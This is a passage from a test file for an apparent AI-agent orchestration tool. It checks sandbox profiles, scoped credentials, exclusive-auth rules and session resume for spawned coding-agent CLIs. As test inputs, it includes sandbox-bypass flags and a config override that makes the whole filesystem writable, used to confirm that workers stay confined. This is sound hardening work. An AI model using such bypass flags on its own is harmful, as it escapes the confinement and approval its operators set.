          profile.indexOf("(deny file-read*"),
        );
        const readSection = profile.slice(profile.indexOf("(deny file-read*"));

        expect(spec.file).toBe("/usr/bin/sandbox-exec");
        expect(spec.cwd).toBe(fs.realpathSync.native(worktree));
        expect(spec.env.HOME).toBe(fs.realpathSync.native(nativeHome));
        expect(spec.env.HOME).not.toBe(
          fs.realpathSync.native(isolatedElectronHome),
        );
        expect(profile).toContain("(allow network*)");
        expect(readSection).toContain(
          `(subpath ${JSON.stringify(fs.realpathSync.native(geminiHome))})`,
        );
        expect(readSection).toContain(
          `(subpath ${JSON.stringify(fs.realpathSync.native(keychains))})`,
        );
        expect(writeSection).toContain(
          `(subpath ${JSON.stringify(fs.realpathSync.native(agyState))})`,
        );
        expect(writeSection).not.toContain(
          `(subpath ${JSON.stringify(fs.realpathSync.native(geminiHome))})`,
        );
        expect(writeSection).not.toContain(
          `(subpath ${JSON.stringify(fs.realpathSync.native(keychains))})`,
        );
        expect(spec.args.join(" ")).not.toContain("mcp_config");
        expect(spec.env.GEMINI_CLI_HOME).toBeUndefined();
        expect(fs.readFileSync(nativeMcpConfig).equals(originalMcpConfig)).toBe(
          true,
        );
        expect(fs.readdirSync(isolatedElectronHome)).toEqual([]);
      } finally {
        if (sessionId) await orchTerminateSession(sessionId);
        userInfoSpy.mockRestore();
        vi.unstubAllEnvs();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  macosIt(
    "uses the native OS profile for a frictionless read-only AGY worker without Seatbelt",
    async () => {
      setSquadCliPolicyLookupForTests(() => "operator-choice");
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "nexus-agy-frictionless-"),
      );
      const worktree = path.join(root, "project", "worktree");
      const nativeHome = path.join(root, "native-home");
      const electronHome = path.join(root, "electron-home");
      const legacyGeminiHome = path.join(root, "legacy-gemini-home");
      fs.mkdirSync(worktree, { recursive: true });
      fs.mkdirSync(nativeHome, { recursive: true });
      fs.mkdirSync(electronHome, { recursive: true });
      fs.mkdirSync(legacyGeminiHome, { recursive: true });
      const nativeUser = os.userInfo();
      const userInfoSpy = vi.spyOn(os, "userInfo").mockReturnValue({
        ...nativeUser,
        homedir: nativeHome,
      });
      vi.stubEnv("HOME", electronHome);
      vi.stubEnv("USERPROFILE", electronHome);
      setAgentSpawnHook(null);
      const host = fakeHost();
      setPtyHost(host.host);
      const baseAuthority = revisionBoundWorker(
        fs.realpathSync.native(worktree),
      );
      const initialPrompt =
        "Inspecione o projeto.\n\n### NEXUS_HANDOFF v1\n{\"status\":\"done\"}";
      const authority: BoundSpawnAuthority = {
        ...baseAuthority,
        context: {
          ...baseAuthority.context!,
          readOnly: true,
          nativeReadOnly: false,
          initialPrompt,
        },
      };
      let sessionId: string | null = null;

      try {
        ({ sessionId } = spawnMainOwnedAgentSession(
          {
            kind: "cli-agent",
            paneId: "agy-frictionless-native-profile",
            cols: 100,
            rows: 30,
          },
          builtinCliPtyAdapter("agy"),
          { keyEnv: { GEMINI_CLI_HOME: legacyGeminiHome } },
          authority,
        ));

        const spec = host.specFor(sessionId);
        const expectedHome = fs.realpathSync.native(nativeHome);
        expect(spec.file).toBe("/mock/bin/agy");
        expect(spec.args).toContain("--dangerously-skip-permissions");
        expect(
          spec.args.filter((arg) => arg === "--prompt-interactive"),
        ).toHaveLength(1);
        expect(
          spec.args[spec.args.indexOf("--prompt-interactive") + 1],
        ).toBe(initialPrompt);
        expect(spec.args).not.toContain("--print");
        expect(spec.args).not.toContain("/usr/bin/sandbox-exec");
        expect(spec.env.HOME).toBe(expectedHome);
        expect(spec.env.USERPROFILE).toBe(expectedHome);
        expect(spec.env.GEMINI_CLI_HOME).toBeUndefined();
      } finally {
        if (sessionId) await orchTerminateSession(sessionId);
        userInfoSpy.mockRestore();
        vi.unstubAllEnvs();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it("does not pass a worker initial prompt to an AGY orchestrator", async () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-agy-maestro-"));
    const worktree = path.join(root, "worktree");
    fs.mkdirSync(worktree);
    const baseAuthority = revisionBoundWorker(
      fs.realpathSync.native(worktree),
    );
    const authority: BoundSpawnAuthority = {
      ...baseAuthority,
      context: {
        ...baseAuthority.context!,
        role: "orchestrator",
        initialPrompt: "must not reach argv",
      },
    };
    const host = fakeHost();
    setPtyHost(host.host);
    let sessionId: string | null = null;

    try {
      ({ sessionId } = spawnMainOwnedAgentSession(
        {
          kind: "cli-agent",
          paneId: "agy-orchestrator",
          cols: 100,
          rows: 30,
        },
        builtinCliPtyAdapter("agy"),
        {},
        authority,
      ));

      const spec = host.specFor(sessionId);
      expect(spec.args).not.toContain("--prompt-interactive");
      expect(spec.args).not.toContain("must not reach argv");
    } finally {
      if (sessionId) await orchTerminateSession(sessionId);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });
});

describe("cli-agent spawn argv hardening", () => {
  it("replaces governed Codex CODEX_HOME in the final spawn but preserves direct panes", () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-spawn-"));
    const home = path.join(root, "home");
    const realCodexHome = path.join(home, ".codex");
    fs.mkdirSync(path.join(realCodexHome, "plugins", "external"), {
      recursive: true,
    });
    fs.writeFileSync(
      path.join(realCodexHome, "config.toml"),
      '[mcp_servers.external]\ncommand = "external-mcp"\n',
    );
    fs.writeFileSync(path.join(realCodexHome, "auth.json"), "{}");
    const h = fakeHost();
    const mintedTokens: string[] = [];
    setPtyHost(h.host);
    vi.stubEnv("HOME", home);
    setAgentSpawnHook((_adapter, _request, authority) => {
      const meta = authority.context;
      const ctx = mintToken({
        label: "test",
        role: meta?.role ?? "user",
        missionId: meta?.missionId,
        contextRevision: meta?.contextRevision,
        workerIncarnationId: meta?.workerIncarnationId,
        scope: authority.coordinationScope ?? authority.scope,
        executionScope: authority.scope,
        allowedTools: meta?.allowedTools ?? null,
        allowedSkills: meta?.allowedSkills ?? null,
      });
      mintedTokens.push(ctx.token);
      return {
        env: {
          NEXUS_MCP_TOKEN: ctx.token,
          NEXUS_HOOK_URL: "http://127.0.0.1:5123/hook/status",
        },
        extraArgs: [
          "-c",
          'mcp_servers.nexus.url="http://127.0.0.1:1/mcp"',
          "--dangerously-bypass-hook-trust",
        ],
      };
    });
    const adapter = makeCodexAdapter();
    const owner = fakeWc();

    try {
      const governed = spawnAgentSession(
        owner,
        { kind: "cli-agent", cols: 80, rows: 24 },
        adapter,
        { keyEnv: { CODEX_HOME: realCodexHome } },
        revisionBoundWorker(),
      );
      const governedSpec = h.specFor(governed.sessionId);
      expectHookLoopbackGrant(governedSpec, 5123);
      expect(governedCodexArgv(governedSpec)).toContain(
        "--dangerously-bypass-hook-trust",
      );
      expect(governedSpec.args).toContain("--strict-config");
      expect(governedSpec.args).toEqual(
        expect.arrayContaining(["--disable", "multi_agent"]),
      );
      expect(governedSpec.env.CODEX_HOME).not.toBe(realCodexHome);
      const governedConfig = parse(
        fs.readFileSync(
          path.join(governedSpec.env.CODEX_HOME!, "config.toml"),
          "utf8",
        ),
      ) as {
        projects?: Record<string, { trust_level?: string }>;
      };
      expect(
        governedConfig.projects?.[revisionBoundWorker().cwd]?.trust_level,
      ).toBe("untrusted");
      expect(
        fs.existsSync(path.join(governedSpec.env.CODEX_HOME!, "plugins")),
      ).toBe(false);

      const direct = spawnAgentSession(
        owner,
        { kind: "cli-agent", cols: 80, rows: 24 },
        adapter,
        { keyEnv: { CODEX_HOME: realCodexHome } },
        trustedSpawn(),
      );
      const directSpec = h.specFor(direct.sessionId);
      expect(directSpec.args).not.toContain("--strict-config");
      expect(directSpec.args).not.toContain("multi_agent");
      expect(directSpec.env.CODEX_HOME).toBe(realCodexHome);
      expect(fs.existsSync(path.join(realCodexHome, "config.toml"))).toBe(true);
      expect(fs.existsSync(path.join(realCodexHome, "plugins"))).toBe(true);

      killSession(owner, governed.sessionId);
      killSession(owner, direct.sessionId);
    } finally {
      for (const token of mintedTokens) cleanupCliMcpSession(token);
      setAgentSpawnHook(null);
      resetGateForTests();
      vi.unstubAllEnvs();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("denies a second exclusive-auth orchestrator even when the first is detached", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const adapter: CliPtyAdapter = {
      ...makeAdapter({
        static: {},
        passthrough: [],
        ephemeralHome: false,
      }),
      id: "claude",
      label: "Claude",
    };
    const first = spawnAgentSession(
      null,
      {
        kind: "cli-agent",
        paneId: "pane-claude-first",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrant(),
    );

    expect(() =>
      spawnAgentSession(
        null,
        {
          kind: "cli-agent",
          paneId: "pane-claude-second",
          cols: 80,
          rows: 24,
        },
        adapter,
        {},
        missionGrant(),
      ),
    ).toThrow(/exclusive auth family.*physical exit proof/i);
    expect(
      listAgentSessions().filter((session) => session.adapterId === "claude"),
    ).toHaveLength(1);
    orchKillSession(first.sessionId);
  });

  it("revokes a stubborn PTY bearer but keeps exclusivity until process-tree proof", async () => {
    resetGateForTests();
    const spawnedHandlers: PtySessionHandlers[] = [];
    const terminate = vi.fn(async () => ({
      ok: false,
      rootExited: false,
      descendantsExited: false,
    }));
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate,
    };
    setPtyHost({
      spawn(_spec, handlers) {
        spawnedHandlers.push(handlers);
        return proc;
      },
    });
    const adapter: CliPtyAdapter = {
      ...makeAdapter({
        static: {},
        passthrough: [],
        ephemeralHome: false,
      }),
      id: "claude",
      label: "Claude",
    };
    const authority = missionGrant();
    const first = spawnAgentSession(
      null,
      {
        kind: "cli-agent",
        paneId: "pane-stubborn-claude",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      authority,
    );
    const gate = mintToken({
      label: "stubborn claude",
      role: "orchestrator",
      missionId: "mission-stubborn",
      scope: authority.scope,
      allowedTools: null,
      allowedSkills: null,
    });
    bindTokenToSession(gate.token, first.sessionId);

    const terminationTap = vi.fn();
    const disposeObserver = tapSessionTermination(terminationTap);
    const disposeRevocation = installMcpSessionTerminationRevocation();
    try {
      const termination = orchTerminateSession(first.sessionId, {
        termTimeoutMs: 1,
        killTimeoutMs: 1,
      });

      // Logical authority is revoked synchronously, before either signal can
      // produce physical exit proof.
      expect(getContext(gate.token)).toBeNull();
      expect(terminationTap).toHaveBeenCalledOnce();
      await expect(termination).resolves.toBe(false);
      expect(proc.terminate).toHaveBeenCalledWith({
        termTimeoutMs: 1,
        killTimeoutMs: 1,
      });

      // The dead bearer does not authorize replacement: the physical process
      // remains in main's inventory until the host reports its real exit.
      expect(
        listAgentSessions().some(
          (session) => session.sessionId === first.sessionId,
        ),
      ).toBe(true);
      expect(() =>
        spawnAgentSession(
          null,
          {
            kind: "cli-agent",
            paneId: "pane-replacement-too-early",
            cols: 80,
            rows: 24,
          },
          adapter,
          {},
          missionGrant(),
        ),
      ).toThrow(/exclusive auth family.*physical exit proof/i);

      await expect(
        orchTerminateSession(first.sessionId, {
          termTimeoutMs: 1,
          killTimeoutMs: 1,
        }),
      ).resolves.toBe(false);
      expect(terminationTap).toHaveBeenCalledOnce();

      // A root callback immediately re-queries the host's stable descendant
      // receipt; make that natural-exit race the successful proof attempt.
      terminate.mockResolvedValueOnce({
        ok: true,
        rootExited: true,
        descendantsExited: true,
      });
      spawnedHandlers[0]?.onExit(0, 9);
      expect(
        listAgentSessions().some(
          (session) => session.sessionId === first.sessionId,
        ),
      ).toBe(true);
      expect(() =>
        spawnAgentSession(
          null,
          {
            kind: "cli-agent",
            paneId: "pane-replacement-root-only",
            cols: 80,
            rows: 24,
          },
          adapter,
          {},
          missionGrant(),
        ),
      ).toThrow(/exclusive auth family.*physical exit proof/i);

      await expect(
        orchTerminateSession(first.sessionId, {
          termTimeoutMs: 1,
          killTimeoutMs: 1,
        }),
      ).resolves.toBe(true);
      expect(
        listAgentSessions().some(
          (session) => session.sessionId === first.sessionId,
        ),
      ).toBe(false);

      const replacement = spawnAgentSession(
        null,
        {
          kind: "cli-agent",
          paneId: "pane-replacement-after-exit",
          cols: 80,
          rows: 24,
        },
        adapter,
        {},
        missionGrant(),
      );
      orchKillSession(replacement.sessionId);
    } finally {
      disposeRevocation();
      disposeObserver();
      spawnedHandlers[0]?.onExit(0, 9);
      resetGateForTests();
    }
  });

  it("refuses persisted mission resume when no exact provider session exists", () => {
    const spawn = vi.fn();
    setPtyHost({ spawn });
    setResumeSessionLookup(() => null);
    const adapter = makeAdapter(
      { static: {}, passthrough: [], ephemeralHome: false },
      {
        resumeArgs: ["--continue"],
        resumeIdArgs: ["--resume"],
      },
    );

    try {
      expect(() =>
        spawnAgentSession(
          fakeWc(),
          {
            kind: "cli-agent",
            paneId: "pane-persisted",
            accountId: "account-main",
            resume: true,
            resumeLatestOnly: false,
            cols: 80,
            rows: 24,
          },
          adapter,
          {},
          persistedMissionGrant(),
        ),
      ).toThrow(/exact main-owned provider session/i);
      expect(spawn).not.toHaveBeenCalled();
    } finally {
      setResumeSessionLookup(null);
    }
  });

  it("resumes a persisted mission only with its exact captured provider session", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    setResumeSessionLookup((_scope, paneId, adapterId, accountId) =>
      paneId === "pane-persisted" &&
      adapterId === "test-cli" &&
      accountId === "account-main"
        ? "provider-session-exact"
        : null,
    );
    const adapter = makeAdapter(
      { static: {}, passthrough: [], ephemeralHome: false },
      {
        resumeArgs: ["--continue"],
        resumeIdArgs: ["--resume"],
      },
    );

    try {
      const spawned = spawnAgentSession(
        fakeWc(),
        {
          kind: "cli-agent",
          paneId: "pane-persisted",
          accountId: "account-main",
          resume: true,
          resumeLatestOnly: false,
          cols: 80,
          rows: 24,
        },
        adapter,
        {},
        persistedMissionGrant(),
      );
      expect(spawned.resumeMode).toBe("exact");
      expect(h.specFor(spawned.sessionId).args).toEqual(
        expect.arrayContaining(["--resume", "provider-session-exact"]),
      );
      expect(h.specFor(spawned.sessionId).args).not.toContain("--continue");
      orchKillSession(spawned.sessionId);
    } finally {
      setResumeSessionLookup(null);
    }
  });

  it("injects the managed hook endpoint and the main-owned PTY session key", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    configureAgentHookEndpointPath("/tmp/nexus-hooks/endpoint.env");
    const owner = fakeWc();
    try {
      const { sessionId } = spawnAgentSession(
        owner,
        { kind: "cli-agent", cols: 80, rows: 24 },
        makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
        {},
        trustedSpawn(),
      );
      expect(h.specFor(sessionId).env.NEXUS_AGENT_HOOK_ENDPOINT).toBe(
        "/tmp/nexus-hooks/endpoint.env",
      );
      expect(h.specFor(sessionId).env.NEXUS_PANE_KEY).toBe(sessionId);
      killSession(owner, sessionId);
    } finally {
      configureAgentHookEndpointPath(null);
    }
  });

  it("lets direct panes follow writable provider policy and keeps workers writable", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const codex = makeCodexAdapter();
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-profile-"));
    let cleanupHook: (() => void) | null = null;
    try {
      const direct = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        codex,
        {},
        trustedSpawn(),
      );
      cleanupHook = installGovernedCodexTestHook(root);
      const worker = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        codex,
        {},
        revisionBoundWorker(),
      );

      expect(h.specFor(direct.sessionId).args).toEqual(
        expect.arrayContaining([
          "--sandbox",
          "workspace-write",
          "--ask-for-approval",
          "on-request",
        ]),
      );
      const workerSpec = h.specFor(worker.sessionId);
      const workerArgs = governedCodexArgv(workerSpec);
      if (process.platform === "darwin") {
        expectDarwinCodexOuterSandbox(workerSpec);
      } else {
        expect(workerArgs).toEqual(
          expect.arrayContaining(["--ask-for-approval", "never"]),
        );
        expect(workerArgs).not.toContain("--sandbox");
      }
      expect(workerArgs).not.toContain("read-only");
      expect(governedCodexPermissionProfile(workerSpec)).toBe(
        "nexus_governed_workspace",
      );
    } finally {
      cleanupHook?.();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("rejects missing and same-root worker scopes before the PTY host", () => {
    for (const authority of [
      {
        ...revisionBoundWorker(),
        coordinationScope: undefined,
      },
      (() => {
        const worker = revisionBoundWorker();
        return {
          ...worker,
          coordinationScope: worker.scope,
        };
      })(),
    ]) {
      const h = fakeHost();
      const spawn = vi.spyOn(h.host, "spawn");
      setPtyHost(h.host);

      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          makeCodexAdapter(),
          {},
          authority,
        ),
      ).toThrow(/coordination scope|physically distinct/i);
      expect(spawn).not.toHaveBeenCalled();
    }
  });

  it("rejects a confined Codex executable override before the PTY host", () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-profile-"));
    const cleanupHook = installGovernedCodexTestHook(root);
    const h = fakeHost();
    const spawn = vi.spyOn(h.host, "spawn");
    setPtyHost(h.host);
    adapterTrust.rejectedBinPath = "/mock/bin/codex-override";
    try {
      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          makeCodexAdapter(),
          { binPath: "/mock/bin/codex-override" },
          revisionBoundWorker(),
        ),
      ).toThrow(/diverges from canonical discovery/i);
      expect(spawn).not.toHaveBeenCalled();
    } finally {
      adapterTrust.rejectedBinPath = null;
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform === "darwin")(
    "fails closed before the PTY host when Main cannot verify its sandbox helper",
    () => {
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "nexus-codex-profile-"),
      );
      const cleanupHook = installGovernedCodexTestHook(root);
      const h = fakeHost();
      const spawn = vi.spyOn(h.host, "spawn");
      setPtyHost(h.host);
      const baseline = darwinSupervisorTrust.resolutionCount;
      darwinSupervisorTrust.error = new Error(
        "Packaged Darwin PTY responsibility supervisor failed verification",
      );
      try {
        expect(() =>
          spawnAgentSession(
            fakeWc(),
            { kind: "cli-agent", cols: 80, rows: 24 },
            makeCodexAdapter(),
            {},
            revisionBoundWorker(),
          ),
        ).toThrow(/supervisor failed verification/i);
        expect(darwinSupervisorTrust.resolutionCount).toBe(baseline + 1);
        expect(spawn).not.toHaveBeenCalled();
      } finally {
        darwinSupervisorTrust.error = null;
        cleanupHook();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it("revalidates the sealed native chain at the last boundary before every governed host spawn", async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-profile-"));
    const cleanupHook = installGovernedCodexTestHook(root);
    const h = fakeHost();
    const hostSpawn = vi.spyOn(h.host, "spawn");
    setPtyHost(h.host);
    const qualificationBaseline = nativeLaunchTrust.qualificationCount;
    const revalidationBaseline = nativeLaunchTrust.revalidationCount;
    let firstSessionId: string | null = null;

    try {
      const first = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        makeCodexAdapter(),
        {},
        revisionBoundWorker(),
      );
      firstSessionId = first.sessionId;
      expect(hostSpawn).toHaveBeenCalledOnce();
      expect(nativeLaunchTrust.qualificationCount).toBe(
        qualificationBaseline + 1,
      );
      expect(nativeLaunchTrust.revalidationCount).toBe(
        revalidationBaseline + 1,
      );
      await expect(orchTerminateSession(first.sessionId)).resolves.toBe(true);
      firstSessionId = null;

      nativeLaunchTrust.swapAfterQualification = true;
      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          makeCodexAdapter(),
          {},
          revisionBoundWorker(),
        ),
      ).toThrow(/changed after qualification/i);
      expect(nativeLaunchTrust.qualificationCount).toBe(
        qualificationBaseline + 2,
      );
      expect(nativeLaunchTrust.revalidationCount).toBe(
        revalidationBaseline + 2,
      );
      expect(hostSpawn).toHaveBeenCalledOnce();
    } finally {
      nativeLaunchTrust.currentIdentity = "vendor-native-v1";
      nativeLaunchTrust.swapAfterQualification = false;
      if (firstSessionId) {
        await orchTerminateSession(firstSessionId);
      }
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("preserves only an exact main-owned Codex resume and rejects latest", () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-profile-"));
    const cleanupHook = installGovernedCodexTestHook(root);
    const providerSessionId = "019d1000-0000-7000-8000-000000000001";
    seedCodexResumeState(root, providerSessionId);
    const h = fakeHost();
    const spawn = vi.spyOn(h.host, "spawn");
    setPtyHost(h.host);
    const codex = {
      ...makeCodexAdapter(),
      spawn: {
        ...makeCodexAdapter().spawn,
        resumeArgs: ["resume", "--last"],
        resumeIdArgs: ["resume"],
      },
    };
    setResumeSessionLookup(() => providerSessionId);
    try {
      const exact = spawnAgentSession(
        fakeWc(),
        {
          kind: "cli-agent",
          paneId: "pane-codex-resume",
          resume: true,
          resumeLatestOnly: false,
          cols: 80,
          rows: 24,
        },
        codex,
        {},
        revisionBoundWorker(),
      );
      expect(h.specFor(exact.sessionId).args).toEqual(
        expect.arrayContaining(["resume", providerSessionId]),
      );
      expect(h.specFor(exact.sessionId).args).not.toContain("--last");
      const resumeSpec = h.specFor(exact.sessionId);
      const resumeConfig = parse(
        fs.readFileSync(
          path.join(resumeSpec.env.CODEX_HOME!, "config.toml"),
          "utf8",
        ),
      ) as {
        default_permissions?: string;
        features?: { network_proxy?: boolean };
        permissions?: Record<
          string,
          { network?: { enabled?: boolean; mode?: string } }
        >;
        tui?: { resume_cwd?: string };
      };
      expect(resumeConfig.default_permissions).toBe(
        CODEX_WORKSPACE_PERMISSION_PROFILE,
      );
      expect(
        resumeConfig.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]
          ?.network?.enabled,
      ).toBe(false);
      expect(
        resumeConfig.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]
          ?.network?.mode,
      ).toBeUndefined();
      expect(resumeConfig.features?.network_proxy).toBe(false);
      expect(resumeConfig.tui?.resume_cwd).toBe("current");

      expect(() =>
        spawnAgentSession(
          fakeWc(),
          {
            kind: "cli-agent",
            paneId: "pane-codex-latest",
            resume: true,
            resumeLatestOnly: true,
            cols: 80,
            rows: 24,
          },
          codex,
          {},
          revisionBoundWorker(),
        ),
      ).toThrow(/exact main-owned provider session/i);
      expect(spawn).toHaveBeenCalledTimes(1);
    } finally {
      setResumeSessionLookup(null);
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it.each(["kimi", "opencode"])(
    "refuses an isolated autonomous %s worker before a process is spawned",
    (adapterId) => {
      const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-pty-sandbox-"));
      const worktree = path.join(root, "worker");
      fs.mkdirSync(worktree);
      try {
        const coordination = trustedSpawn(fs.realpathSync(root)).scope;
        const execution = trustedSpawn(fs.realpathSync(worktree)).scope;
        const authority: BoundSpawnAuthority = {
          source: "pending",
          cwd: execution.rootRealPath,
          scope: execution,
          coordinationScope: coordination,
          context: {
            missionId: "mission-isolated",
            contextRevision: "revision-isolated",
            role: "worker",
            workerIncarnationId: "worker-isolated",
            allowedTools: [],
            allowedSkills: null,
            scope: coordination,
            executionScope: execution,
          },
        };
        const adapter = builtinCliPtyAdapter(adapterId);
        const h = fakeHost();
        const spawn = vi.spyOn(h.host, "spawn");
        setPtyHost(h.host);

        expect(() =>
          spawnAgentSession(
            fakeWc(),
            { kind: "cli-agent", cols: 80, rows: 24 },
            adapter,
            { extraArgs: adapter.control?.permission?.yolo ?? [] },
            authority,
          ),
        ).toThrow(/workspace-write confinement/i);
        expect(spawn).not.toHaveBeenCalled();
      } finally {
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it.each([
    ["kimi", "--auto"],
    ["agy", "--dangerously-skip-permissions"],
    ["codex", "--dangerously-bypass-approvals-and-sandbox"],
  ])(
    "runs an isolated autopilot %s worker without an outer sandbox and keeps web/auto approval",
    (adapterId, expectedApprovalArg) => {
      setSquadCliPolicyLookupForTests(() => "operator-choice");
      const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-pty-auto-"));
      const worktree = path.join(root, "worker");
      fs.mkdirSync(worktree);
      try {
        const coordination = trustedSpawn(fs.realpathSync(root)).scope;
        const execution = trustedSpawn(fs.realpathSync(worktree)).scope;
        const authority: BoundSpawnAuthority = {
          source: "pending",
          cwd: execution.rootRealPath,
          scope: execution,
          coordinationScope: coordination,
          context: {
            missionId: "mission-autopilot",
            contextRevision: "revision-autopilot",
            role: "worker",
            workerIncarnationId: `worker-${adapterId}`,
            allowedTools: [],
            allowedSkills: null,
            scope: coordination,
            executionScope: execution,
          },
        };
        const adapter =
          adapterId === "codex"
            ? makeCodexAdapter()
            : builtinCliPtyAdapter(adapterId);
        const h = fakeHost();
        setPtyHost(h.host);

        const spawned = spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          adapter,
          {},
          authority,
        );
        const spec = h.specFor(spawned.sessionId);
        expect(spec.file).toBe(`/mock/bin/${adapter.bin}`);
        expect(spec.args).toContain(expectedApprovalArg);
        expect(spec.args).not.toContain("/usr/bin/sandbox-exec");
        if (adapterId === "codex") {
          expect(spec.args).toContain("--search");
          expect(spec.env.CODEX_HOME).toBeUndefined();
        }
        orchKillSession(spawned.sessionId);
      } finally {
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it("records the native authority actually applied to an autopilot orchestrator", () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const h = fakeHost();
    setPtyHost(h.host);
    const base = trustedSpawn();
    const authority: BoundSpawnAuthority = {
      ...base,
      source: "pending",
      coordinationScope: base.scope,
      context: {
        missionId: "mission-autopilot-orchestrator",
        contextRevision: "revision-autopilot-orchestrator",
        role: "orchestrator",
        readOnly: false,
        nativeReadOnly: false,
        allowedTools: ["nexus_pane_spawn"],
        allowedSkills: null,
        scope: base.scope,
        executionScope: base.scope,
      },
    };

    const spawned = spawnMainOwnedAgentSession(
      {
        kind: "cli-agent",
        cols: 80,
        rows: 24,
        paneId: "pane-autopilot-orchestrator",
        adapterId: "test-cli",
      },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      authority,
    );

    expect(getAgentSessionInfo(spawned.sessionId)).toMatchObject({
      role: "orchestrator",
      missionId: "mission-autopilot-orchestrator",
      readOnly: false,
      nativeReadOnly: false,
    });
    orchKillSession(spawned.sessionId);
  });

  it("refuses an autopilot read-only worker in the real checkout", () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-pty-review-"));
    try {
      const coordination = trustedSpawn(fs.realpathSync(root)).scope;
      const adapter = builtinCliPtyAdapter("kimi");
      const h = fakeHost();
      const spawn = vi.spyOn(h.host, "spawn");
      setPtyHost(h.host);

      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          adapter,
          {},
          {
            source: "pending",
            cwd: coordination.rootRealPath,
            scope: coordination,
            coordinationScope: coordination,
            context: {
              missionId: "mission-review",
              contextRevision: "revision-review",
              role: "worker",
              workerIncarnationId: "worker-review",
              readOnly: true,
              nativeReadOnly: true,
              allowedTools: [],
              allowedSkills: null,
              scope: coordination,
              executionScope: coordination,
            },
          },
        ),
      ).toThrow(/physically distinct execution worktree/i);
      expect(spawn).not.toHaveBeenCalled();
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("pins an isolated Codex worker to workspace-write even when settings request bypass", () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-pty-sandbox-"));
    const worktree = path.join(root, "worker");
    fs.mkdirSync(worktree);
    const cleanupHook = installGovernedCodexTestHook(root);
    try {
      const coordination = trustedSpawn(fs.realpathSync(root)).scope;
      const execution = trustedSpawn(fs.realpathSync(worktree)).scope;
      const authority: BoundSpawnAuthority = {
        source: "pending",
        cwd: execution.rootRealPath,
        scope: execution,
        coordinationScope: coordination,
        context: {
          missionId: "mission-isolated",
          contextRevision: "revision-isolated",
          role: "worker",
          workerIncarnationId: "worker-isolated",
          allowedTools: [],
          allowedSkills: null,
          scope: coordination,
          executionScope: execution,
        },
      };
      const h = fakeHost();
      setPtyHost(h.host);
      const codex = makeCodexAdapter();
      adapterTrust.builtinIds.delete("codex");
      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          codex,
          {},
          authority,
        ),
      ).toThrow(/trusted builtin/i);
      adapterTrust.builtinIds.add("codex");

      const spawned = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        codex,
        {
          extraArgs: [
            "--dangerously-bypass-approvals-and-sandbox",
            "--add-dir",
            root,
            "-c",
            'sandbox_workspace_write.writable_roots=["/"]',
          ],
        },
        authority,
      );
      const spec = h.specFor(spawned.sessionId);
      const protectedAgentsPath = path.join(
        fs.realpathSync(execution.rootRealPath),
        ".agents",
      );
      const config = parse(
        fs.readFileSync(
          path.join(spec.env.CODEX_HOME!, "config.toml"),
          "utf8",
        ),
      ) as {
        permissions?: Record<
          string,
          { filesystem?: Record<string, string> }
        >;
      };

      // Darwin cannot nest Seatbelt profiles. Nexus owns the outer physical
      // boundary and Codex runs without a second inner sandbox.
      expectDarwinCodexOuterSandbox(spec);
      expect(governedCodexArgv(spec)).toEqual([
        "--model",
        "gpt-5.6-terra",
        "--strict-config",
        "--disable",
        "multi_agent",
        "--sandbox",
        "danger-full-access",
        "--ask-for-approval",
        "on-request",
      ]);
      expect(
